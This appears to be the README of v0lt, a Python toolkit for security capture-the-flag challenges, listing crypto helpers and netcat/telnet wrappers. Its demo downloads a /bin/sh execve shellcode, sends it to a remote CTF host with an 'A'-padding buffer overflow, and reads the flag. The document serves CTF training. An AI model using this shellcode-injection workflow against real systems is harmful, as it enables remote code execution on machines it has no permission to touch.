![v0lt](https://raw.githubusercontent.com/P1kachu/v0lt/master/v0lt/assets/v0lt.png)

v0lt
====

v0lt is an attempt to regroup every tool I used/use/will use in security CTF, Python style. 
A lot of exercises were solved using bash scripts but Python may be more flexible, that's why.    

##Requirements and Installation    
####Dependencies:   
* Python3    
  * BeautifulSoup    
  * Requests    

####Installation:   
```Bash
git clone https://github.com/P1kachu/v0lt.git     
cd v0lt    
sudo python3 setup.py install # sudo is required for potentially missing dependencies    
```

##Demo: Shellcodes
```Python
>>> from v0lt import shellcode
>>> from v0lt.netcat import Netcat
>>> nc = Netcat("remote.ctf.com", 4444)
Port 4444: GIVE ME SHELLCODZ
>>> shell_code = shellcode.get_shellcodes("bin","execve")

.
.
.
85: Linux/x86:setuid(0) & execve(/sbin/poweroff -f) - 47 bytes
86: Linux/x86:execve (/bin/sh) - 21 Bytes
87: Linux/x86:break chroot execve /bin/sh - 80 bytes
88: Linux/x86:execve(/bin/sh,0,0) - 21 bytes
.
.
.

Selection: 86
You chosed http://shell-storm.org/shellcode/files/shellcode-752.php
Shellcode: "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62[...]"
>>> nc.shellcat(shell_code)
>>> nc.writeln("A"*178)
>>> exploit = nc.dialogue("cat flag", 3)
>>> print(exploit)
File name too long
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{EasyPe4syL3m0nSq33zy!!}
```
##Implemented:    
* Crypto    
    * Base64    
    * Ceasar shift    
    * Hashing functions (SHA, MD5)    
    * Bits manipulations (Xor)    
    * Usual conversions (bytes/strings/hex)    
    * RSA basics (inverse modulo, inverse power, egcd...)    

* Shellcodes    
    * Shellcode selection and download from Shell-storm repo    
    * Shellcode formater 
    * Shell{cat,net}: Sending shellcode made easy

* Easy connection support    
    * Netcat    
    * Telnet    

And more
